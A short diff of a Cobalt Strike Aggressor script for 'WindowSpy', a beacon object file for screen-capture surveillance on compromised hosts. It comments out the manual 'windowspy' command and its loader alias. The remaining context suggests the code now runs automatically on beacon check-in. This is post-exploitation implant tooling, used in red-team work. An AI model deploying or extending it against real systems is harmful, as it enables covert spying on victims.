@@ -28,31 +28,31 @@ sub spy{
 	#spy stuff goes here
 }
 
-#Register command
-beacon_command_register(
-    "windowspy",
-    "windowspy",
-    "Use: windowspy"
-);
+# #Register command
+# beacon_command_register(
+#     "windowspy",
+#     "windowspy",
+#     "Use: windowspy"
+# );
 
-alias windowspy {
-    local('$bid $barch $handle $data $args $target_pid');
-    $bid = $1;
-    # figure out the arch of this session
-    $barch  = barch($bid);
+# alias windowspy {
+#     local('$bid $barch $handle $data $args $target_pid');
+#     $bid = $1;
+#     # figure out the arch of this session
+#     $barch  = barch($bid);
 
-    # read in the right BOF file
-    $handle = openf(script_resource("WindowSpy. $+ $barch $+ .obj"));
-    $data = readb($handle, -1);
-    closef($handle);
+#     # read in the right BOF file
+#     $handle = openf(script_resource("WindowSpy. $+ $barch $+ .obj"));
+#     $data = readb($handle, -1);
+#     closef($handle);
     
-    $args   = bof_pack($bid);
+#     $args   = bof_pack($bid);
 
-    # announce what we're doing
-    btask($bid, "Running WindowSpy by (@codex_tf2)", "T1113");
-    # execute it.
-    beacon_inline_execute($bid, $data, "go", $args);
-}
+#     # announce what we're doing
+#     btask($bid, "Running WindowSpy by (@codex_tf2)", "T1113");
+#     # execute it.
+#     beacon_inline_execute($bid, $data, "go", $args);
+# }
 
 on beacon_checkin {
     local('$bid $barch $handle $data $args $target_pid');
